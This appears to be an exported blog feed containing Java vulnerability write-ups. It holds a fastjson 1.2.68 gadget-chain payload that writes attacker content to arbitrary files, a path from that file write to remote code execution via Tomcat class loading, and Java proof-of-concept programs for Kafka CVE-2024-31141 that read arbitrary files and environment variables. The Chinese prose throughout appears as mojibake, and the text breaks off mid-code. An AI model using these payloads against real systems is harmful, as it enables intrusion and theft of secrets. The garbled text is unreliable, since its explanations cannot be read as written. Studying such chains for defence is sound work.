class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;cs&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.String&quot;</span></span><br><span class="line">          <span class="string">&quot;$&#123;shellcode&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;charset&quot;</span><span class="punctuation">:</span> <span class="string">&quot;iso-8859-1&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span> $<span class="punctuation">&#123;</span>size<span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;branch&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.output.WriterOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;writer&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.output.LockableFileWriter&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;file&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;file2write&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;charset&quot;</span><span class="punctuation">:</span> <span class="string">&quot;iso-8859-1&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;append&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">          <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;charset&quot;</span><span class="punctuation">:</span> <span class="string">&quot;iso-8859-1&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span> <span class="number">1024</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;writeImmediately&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;closeBranch&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.io.InputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;reader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;inputStream&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$.a&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;httpContentType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;text/xml&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;lenient&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;defaultEncoding&quot;</span><span class="punctuation">:</span> <span class="string">&quot;iso-8859-1&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;iso-8859-1&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span> <span class="number">1024</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;c&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œå’Œblackhatçš„è®®é¢˜æåˆ°çš„ä¹Ÿæœ‰å¾ˆå¤šå…±é€šä¹‹å¤„ï¼Œéƒ½æ˜¯åˆ©ç”¨<code>org.apache.commons.io.input.TeeInputStream#read()</code>æ–¹æ³•æ¥å†™å…¥æ•°æ®</p><p><img src="https://s2.loli.net/2024/12/06/PyQw8an1jANZiKD.png"></p><p>å…¶ä¸­çš„ä¸€äº›ç»†èŠ‚å¯ä»¥å‚è€ƒ</p><p><a href="https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg">Fastjson 1.2.68 ååºåˆ—åŒ–æ¼æ´ Commons IO 2.x å†™æ–‡ä»¶åˆ©ç”¨é“¾æŒ–æ˜åˆ†æ</a></p><p>ä½†æ˜¯è¿™é‡Œä½œè€…ä¼¼ä¹æ‰¾åˆ°äº†ä¸€ä¸ªæ›´å¥½çš„é“¾å­è§„é¿blackhatè®®é¢˜ä¸­åŸPocé“¾å­ä¸­å­˜åœ¨çš„å†™å…¥ç¼“å†²åŒºçš„8192å­—èŠ‚é™åˆ¶</p><p><img src="https://s2.loli.net/2024/12/06/vybF63gZr5WcBtK.png"></p><p><img src="https://s2.loli.net/2024/12/06/i385Ns6QWzLGV7d.png"></p><h2 id="write2RCE"><a href="#write2RCE" class="headerlink" title="write2RCE"></a>write2RCE</h2><p>ç„¶åéœ€è¦è®¨è®ºçš„å°±æ˜¯å¦‚ä½•åœ¨ä»»æ„æ–‡ä»¶å†™å…¥çš„æƒ…å†µä¸‹RCE</p><p><a href="https://mrwq.github.io/aggregate-paper/butian/JDK8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%88%B0RCE/">https://mrwq.github.io/aggregate-paper/butian/JDK8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%88%B0RCE/</a></p><p><a href="https://landgrey.me/blog/22/">Spring Boot Fat Jar å†™æ–‡ä»¶æ¼æ´åˆ°ç¨³å®š RCE çš„æ¢ç´¢</a></p><p>å¸¸è§çš„åšæ³•æ¯”å¦‚è¦†ç›–charsets.jarå°±æ˜¯åˆ©ç”¨jvmçš„æ‡’åŠ è½½ï¼Œè¦†ç›–<font style="color:rgb(74, 81, 83);">JDK HOME ç›®å½•ä¸‹åŸæœ‰çš„ jarä¸­</font>æœªè¢«åŠ è½½çš„charsets.jaråŒ…ã€‚ä½†è¿™ä¸ªåšæ³•éœ€è¦äº‹å…ˆçŸ¥é“ JDK HOME çš„ç›®å½•è·¯å¾„ï¼Œå¹¶ä¸”éœ€è¦rootæƒé™ã€‚è€Œä¸”éœ€è¦é’ˆå¯¹ç›®æ ‡æœåŠ¡jdkç‰ˆæœ¬å‡†å¤‡æ¶æ„charsets.jaræ–‡ä»¶ï¼Œå¦åˆ™å¯èƒ½å½±å“æ­£å¸¸æœåŠ¡ï¼›åˆæ¯”å¦‚åˆ©ç”¨ç±»åŠ è½½ï¼Œåœ¨jdk homeç›®å½•ä¸‹å‘classesç›®å½•å†™å…¥æ¶æ„classæ–‡ä»¶ï¼Œç„¶ååˆ©ç”¨fastjsonçš„<code>@type</code>è§¦å‘ç±»åŠ è½½å³å¯RCE</p><p>è¿™é‡Œä½œè€…ä¹Ÿæ˜¯åˆ©ç”¨äº†ç±»åŠ è½½ï¼Œä¸è¿‡è¿™é‡Œæ¢äº†ä¸€ä¸ªæ–°çš„ç±»åŠ è½½å£å­</p><p>åœ¨fastjsonååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œé’ˆå¯¹ä¸åœ¨é»‘ç™½åå•ï¼Œå¹¶ä¸”ç¼“å­˜ä¸­æ²¡æœ‰çš„ç±»ä¼šé€šè¿‡<code>com.alibaba.fastjson.util.TypeUtils#loadClass()</code>å°è¯•åŠ è½½ç±»ï¼Œå…¶ä¸­ä¼šé€šè¿‡é€šè¿‡<code>TomcatEmbeddedWebappClassLoader</code>ç±»åŠ è½½å™¨åŠ è½½ç±»</p><p><img src="https://s2.loli.net/2024/12/06/yjiV3t7FDRwpx9z.png"></p><p>æ ¹æ®åŒäº²å§”æ´¾æœºåˆ¶ä¼šå§”æ´¾<code>WebappClassLoaderBase</code>æ¥åŠ è½½ï¼Œä¸€è·¯è·Ÿä¸‹å»å¯ä»¥å‘ç°åœ¨<code>org.apache.catalina.loader.WebappClassLoaderBase#findClass</code>ä¸­ä¼šè°ƒç”¨<code>org.apache.catalina.loader.WebappClassLoaderBase#findClassInternal</code>æ–¹æ³•æ¥å¯»æ‰¾å†…éƒ¨ç±»</p><p><img src="https://s2.loli.net/2024/12/06/Kw93dtihj1lrUbz.png"></p><p>è·Ÿè¿›<code>findClassInternal</code></p><p><img src="https://s2.loli.net/2024/12/06/op6Bkv4KFyXPWdH.png"></p><p>è¿›ä¸€æ­¥è·Ÿè¿›<code>org.apache.catalina.webresources.StandardRoot#getClassLoaderResource</code>è·Ÿè¸ªç±»åŠ è½½è·¯å¾„</p><p><img src="https://s2.loli.net/2024/12/06/6NYIJHn8te5VU1m.png"></p><p><img src="https://s2.loli.net/2024/12/06/4dE2QITebDiFmA1.png"></p><p>è¿™é‡Œä¼šåˆ¤æ–­<code>isCachingAllowed()</code>ï¼Œè€Œå±æ€§<code>cachingAllowed</code>é»˜è®¤ä¸ºtrue</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isCachingAllowed</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.cachingAllowed;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/12/06/pFwBZAL3VOdE42m.png"></p><p>æ‰€ä»¥è¿›åˆ°<code>org.apache.catalina.webresources.Cache#getResource</code>æ–¹æ³•</p><p><img src="https://s2.loli.net/2024/12/06/Ql8PvtHAC26RWFT.png"></p><p>é¦–å…ˆè°ƒç”¨noCacheæ–¹æ³•ï¼Œå¾ˆæ˜æ˜¾è¿™é‡Œä¼šè¿”å›trueï¼Œä»è€Œè°ƒç”¨åˆ°<code>this.root.getResourceInternal(path, useClassLoaderResources)</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">noCache</span><span class="params">(String path)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> path.endsWith(<span class="string">&quot;.class&quot;</span>) &amp;&amp; (path.startsWith(<span class="string">&quot;/WEB-INF/classes/&quot;</span>) || path.startsWith(<span class="string">&quot;/WEB-INF/lib/&quot;</span>)) || path.startsWith(<span class="string">&quot;/WEB-INF/lib/&quot;</span>) &amp;&amp; path.endsWith(<span class="string">&quot;.jar&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·Ÿè¿›<code>org.apache.catalina.webresources.StandardRoot#getResourceInternal</code></p><p><img src="https://s2.loli.net/2024/12/06/UIC9luhJn8txDev.png"></p><p>å°±å¯ä»¥å‘ç°è¿™ä¸ªç±»åŠ è½½è·¯å¾„</p><p><img src="https://s2.loli.net/2024/12/06/n31oU8SBHftCmLJ.png"></p><p>å¦‚æœè¿™ä¸ªclassæ–‡ä»¶å­˜åœ¨å°±ä¼šæ­£å¸¸è¿”å›è¯¥æ–‡ä»¶èµ„æºï¼Œç„¶åæ¶æ„ç±»åŠ è½½è¾¾åˆ°RCE</p><h1 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h1><p>å¥½å¤æ‚å¥½å¤æ‚ï¼Œç»“åˆä¸‰ç¯‡è®®é¢˜pptæ‰èƒ½å¾®æ‡‚</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> security </tag>
            
            <tag> fastjson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Kafka CVE-2024-31141å­¦ä¹ </title>
      <link href="/2024/12/08/Apache%20Kafka%20CVE-2024-31141%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/12/08/Apache%20Kafka%20CVE-2024-31141%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p><a href="https://advisories.gitlab.com/pkg/maven/org.apache.kafka/kafka-clients/CVE-2024-31141/">CVE-2024-31141: Apache Kafka Clients: Privilege escalation to filesystem read-access via automatic ConfigProvider</a></p><h1 id="æ¼æ´ç®€ä»‹"><a href="#æ¼æ´ç®€ä»‹" class="headerlink" title="æ¼æ´ç®€ä»‹"></a>æ¼æ´ç®€ä»‹</h1><p><font style="color:rgb(55, 65, 81);">Apache Kafka å®¢æˆ·ç«¯æ¥å—é…ç½®æ•°æ®ä»¥è‡ªå®šä¹‰è¡Œä¸ºï¼Œå¹¶åŒ…å« ConfigProvider æ’ä»¶ä»¥æ“ä½œè¿™äº›é…ç½®ã€‚ Apache Kafka è¿˜æä¾› FileConfigProviderã€DirectoryConfigProvider å’Œ EnvVarConfigProvider å®ç°ï¼Œå…¶ä¸­åŒ…æ‹¬ä»ç£ç›˜æˆ–ç¯å¢ƒå˜é‡è¯»å–çš„åŠŸèƒ½ã€‚åœ¨ Apache Kafka å®¢æˆ·ç«¯é…ç½®å¯ä»¥ç”±ä¸å—ä¿¡ä»»æ–¹æŒ‡å®šçš„åº”ç”¨ç¨‹åºä¸­ï¼Œæ”»å‡»è€…å¯ä»¥ä½¿ç”¨è¿™äº› ConfigProvider è¯»å–ç£ç›˜å’Œç¯å¢ƒå˜é‡çš„ä»»æ„å†…å®¹ã€‚</font></p><p><font style="color:rgb(55, 65, 81);">æ­¤é—®é¢˜å½±å“ Apache Kafka å®¢æˆ·ç«¯ï¼šä» 2.3.0 åˆ° 3.5.2ã€3.6.2ã€3.7.0ã€‚</font></p><h1 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h1><p>æ ¹ç›®å½•ä¸‹åˆ›å»º1.propertiesæ–‡ä»¶</p><p><img src="https://s2.loli.net/2024/12/08/5kJXZ3oTtfNCcE2.png"></p><p>ç„¶åé…ç½®å®¢æˆ·ç«¯è¿æ¥çš„é…ç½®é¡¹ï¼Œåœ¨çœŸå®åœºæ™¯ä¸‹å­˜åœ¨äºkafkaå®¢æˆ·ç«¯å¯æ§è‡ªå®šä¹‰é…ç½®çš„åœºæ™¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.kafka.clients.producer.KafkaProducer;</span><br><span class="line"><span class="keyword">import</span> org.apache.kafka.clients.producer.Producer;</span><br><span class="line"><span class="keyword">import</span> org.apache.kafka.common.config.provider.FileConfigProvider;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Properties</span> <span class="variable">providers</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">        providers.put(<span class="string">&quot;bootstrap.servers&quot;</span>, <span class="string">&quot;localhost:9092&quot;</span>);</span><br><span class="line">        providers.put(<span class="string">&quot;key.serializer&quot;</span>,<span class="string">&quot;org.apache.kafka.common.serialization.StringSerializer&quot;</span>);</span><br><span class="line">        providers.put(<span class="string">&quot;value.serializer&quot;</span>,<span class="string">&quot;org.apache.kafka.common.serialization.StringSerializer&quot;</span>);</span><br><span class="line">        providers.put(<span class="string">&quot;config.providers&quot;</span>, <span class="string">&quot;x&quot;</span>);</span><br><span class="line">        providers.put(<span class="string">&quot;config.providers.x.class&quot;</span>, FileConfigProvider.class.getName());</span><br><span class="line">        providers.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;$&#123;x:/1.properties:password&#125;&quot;</span>);</span><br><span class="line">        Producer&lt;String, String&gt; producer = <span class="keyword">new</span> <span class="title class_">KafkaProducer</span>&lt;&gt;(providers);</span><br><span class="line">        producer.initTransactions();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/12/08/E58nRBJ9dDjKSFg.png"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡ŒæˆåŠŸè¯»å–propertiesæ–‡ä»¶å†…å®¹ï¼Œå­˜å…¥åˆ°å¯¹è±¡ä¸­ï¼Œåœ¨åç»­å¤„ç†æˆ–æ—¥å¿—å¤„ç†ä¸­å¯èƒ½ä¼šæ³„éœ²å‡ºæ¥</p><p>ç±»ä¼¼çš„è¿˜å¯ä»¥è·å–ç¯å¢ƒå˜é‡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.kafka.clients.producer.KafkaProducer;</span><br><span class="line"><span class="keyword">import</span> org.apache.kafka.clients.producer.Producer;</span><br><span class="line"><span class="keyword">import</span> org.apache.kafka.common.config.provider.EnvVarConfigProvider;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EnvVarConfigProviderTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Properties</span> <span class="variable">providers</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">        providers.put(<span class="string">&quot;bootstrap.servers&quot;</span>, <span class="string">&quot;localhost:9092&quot;</span>);</span><br><span class="line">        providers.put(<span class="string">&quot;key.serializer&quot;</span>,<span class="string">&quot;org.apache.kafka.common.serialization.StringSerializer&quot;</span>);</span><br><span class="line">        providers.put(<span class="string">&quot;value.serializer&quot;</span>,<span class="string">&quot;org.apache.kafka.common.serialization.StringSerializer&quot;</span>);</span><br><span class="line">        providers.put(<span class="string">&quot;config.providers&quot;</span>, <span class="string">&quot;x&quot;</span>);</span><br><span class="line">        providers.put(<span class="string">&quot;config.providers.x.class&quot;</span>, EnvVarConfigProvider.class.getName());</span><br><span class="line">        providers.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;$&#123;x::USERDOMAIN_ROAMINGPROFILE&#125;&quot;</span>);</span><br><span class="line">        Producer&lt;String, String&gt; producer = <span class="keyword">new</span> <span class="title class_">KafkaProducer</span>&lt;&gt;(providers);</span><br><span class="line">        producer.initTransactions();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/12/08/c1sRTlaL9qge2Kf.png"></p><p><img src="https://s2.loli.net/2024/12/08/zJEwm36hcXprOnZ.png"></p><p><font style="color:rgb(55, 65, 81);">DirectoryConfigProvider</font>æœ¬ä»¥ä¸ºæ˜¯å¯ä»¥åˆ—ç›®å½•ï¼Œç»“æœæ˜¯æ–‡ä»¶è¯»å–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.kafka.clients.producer.KafkaProducer;</span><br><span class="line"><span class="keyword">import</span> org.apache.kafka.clients.producer.Producer;</span><br><span class="line"><span class="keyword">import</span> org.apache.kafka.common.config.provider.DirectoryConfigProvider;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DirectoryConfigProviderTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Properties</span> <span class="variable">providers</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">        providers.put(<span class="string">&quot;bootstrap.servers&quot;</span>, <span class="string">&quot;localhost:9092&quot;</span>);</span><br><span class="line">        providers.put(<span class="string">&quot;key.serializer&quot;</span>,<span class="string">&quot;org.apache.kafka.common.serialization.StringSerializer&quot;</span>);</span><br><span class="line">        providers.put(<span class="string">&quot;value.serializer&quot;</span>,<span class="string">&quot;org.apache.kafka.common.serialization.StringSerializer&quot;</span>);</span><br><span class="line">        providers.put(<span class="string">&quot;config.providers&quot;</span>, <span class="string">&quot;x&quot;</span>);</span><br><span class="line">        providers.put(<span class="string">&quot;config.providers.x.class&quot;</span>, DirectoryConfigProvider.class.getName());</span><br><span class="line">        providers.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;$&#123;x:/:1.properties&#125;&quot;</span>);</span><br><span class="line">        Producer&lt;String, String&gt; producer = <span class="keyword">new</span> <span class="title class_">KafkaProducer</span>&lt;&gt;(providers);</span><br><span class="line">        producer.initTransactions();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/12/08/jzh5cHRitOb6ake.png"></p><h1 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h1><p><a href="https://github.com/apache/kafka/blob/trunk/clients/src/main/java/org/apache/kafka/common/config/AbstractConfig.java#L65">kafka&#x2F;clients&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;apache&#x2F;kafka&#x2F;common&#x2F;config&#x2F;AbstractConfig.java at trunk Â· apache&#x2F;kafka</a></p><p>æ ¹æ®æ¼æ´é€šå‘Šå¯ä»¥å‘ç°å’Œ<code>org.apache.kafka.automatic.config.providers</code>æœ‰å…³</p><p>åœ¨githubçš„apache kafkaä»“åº“å¯ä»¥æœç´¢åˆ°ç›¸å…³ä»£ç </p><p>è·Ÿè¸ª<code>AUTOMATIC_CONFIG_PROVIDERS_PROPERTY</code>ï¼Œå¯ä»¥åœ¨è¿™ä¸ªé™„è¿‘æ‰¾åˆ°å¾ˆå¤šçš„ä»£ç </p><p><a href="https://github.com/apache/kafka/blob/trunk/clients/src/test/java/org/apache/kafka/common/config/AbstractConfigTest.java#L526">kafka&#x2F;clients&#x2F;src&#x2F;test&#x2F;java&#x2F;org&#x2F;apache&#x2F;kafka&#x2F;common&#x2F;config&#x2F;AbstractConfigTest.java at trunk Â· apache&#x2F;kafka</a></p><p>ä»–ä»¬ä¼¼ä¹éƒ½ä½¿ç”¨äº†<code>$&#123;a:b:c&#125;</code>çš„æ ¼å¼åœ¨è¯»å–é…ç½®é¡¹ï¼Œå› ä¸ºå¾ˆå¤šæ–‡ä»¶è·¯å¾„å½¢å¼</p><p>ç»§ç»­æ ¹æ®é€šå‘Šä¸­æ‰€è¯´çš„<code>Apache Kafka also provides FileConfigProvider, DirectoryConfigProvider, and EnvVarConfigProvider implementations which include the ability to read from disk or environment variables.</code></p><p>ç»“åˆæºç çœ‹çœ‹å®ç°</p><p><code>org.apache.kafka.common.config.provider.FileConfigProvider#get(java.lang.String, java.util.Set&lt;java.lang.String&gt;)</code>å¯ä»¥å‘ç°æ–‡ä»¶è¯»å–çš„ä½ç½®</p><p><img src="https://s2.loli.net/2024/12/08/8qWQiDAf6nZexSM.png"></p><p>ç»™è¿™ä¸ªç±»çš„å‡½æ•°åŠ ä¸Šæ–­ç‚¹è°ƒè¯•</p><p>å¯ä»¥å‘ç°åœ¨å®ä¾‹åŒ–è§£æé…ç½®é¡¹è¿‡ç¨‹ä¸­è°ƒç”¨<code>org.apache.kafka.common.config.AbstractConfig#instantiateConfigProviders</code>è§£æconfigProviderçš„å†…å®¹</p><p>è¿™é‡Œä¼šè°ƒç”¨<code>provider.configure</code>æ–¹æ³•ï¼Œè¿™é‡Œproviderçš„ç±»åæŒ‡å‘FileConfigProvider</p><p><img src="https://s2.loli.net/2024/12/08/BIki1ASgsH9Ou6c.png"></p><p>äºæ˜¯è°ƒç”¨åˆ°<code>org.apache.kafka.common.config.provider.FileConfigProvider#configure</code>æ— äº‹å‘ç”Ÿï¼Œç»§ç»­è°ƒè¯•ï¼Œå¯ä»¥å‘ç°è°ƒç”¨äº†<code>org.apache.kafka.common.config.ConfigTransformer#transform</code>æ¥è§£æä¸æ˜¯ç›´æ¥çš„å˜é‡ï¼Œ<img src="https://s2.loli.net/2024/12/08/ylNEzorYSfXHgZb.png"></p><p>å¯ä»¥å‘ç°æ»¡è¶³è¿™ä¸ªæ­£åˆ™åŒ¹é…å³å¯è¿›è¡Œè§£æ<code>\$\&#123;([^&#125;]*?):(([^&#125;]*?):)?([^&#125;]*?)\&#125;</code></p><p><img src="https://s2.loli.net/2024/12/08/XwBDZy45jmRSu3s.png"></p><p><code>$&#123;a:b:c&#125;</code>è¢«è§£æä¸ºäº†<code>providerName</code>ã€<code>path</code>ã€<code>variable</code></p><p><img src="https://s2.loli.net/2024/12/08/6ErvfhBRuXP5T4d.png"></p><p>è°ƒè¯•åˆ°è¿™é‡Œå¯ä»¥å‘ç°ï¼Œè°ƒç”¨åˆ°äº†æ–‡ä»¶è¯»å–çš„åœ°æ–¹</p><p><img src="https://s2.loli.net/2024/12/08/QiTbB1xdJGXDvLq.png"></p><p><img src="https://s2.loli.net/2024/12/08/7ULVpEG13SMPuFT.png"></p><p>ç±»ä¼¼çš„ï¼Œè·å–ç¯å¢ƒå˜é‡è¿™é‡Œä¸»è¦åˆ†æ<code>org.apache.kafka.common.config.provider.EnvVarConfigProvider#get(java.lang.String, java.util.Set&lt;java.lang.String&gt;)</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ConfigData <span class="title function_">get</span><span class="params">(String path, Set&lt;String&gt; keys)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (path != <span class="literal">null</span> &amp;&amp; !path.isEmpty()) &#123;</span><br><span class="line">        log.error(<span class="string">&quot;Path is not supported for EnvVarConfigProvider, invalid value &#x27;&#123;&#125;&#x27;&quot;</span>, path);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConfigException</span>(<span class="string">&quot;Path is not supported for EnvVarConfigProvider, invalid value &#x27;&quot;</span> + path + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (keys == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ConfigData</span>(<span class="built_in">this</span>.filteredEnvVarMap);</span><br><span class="line">    &#125; <span 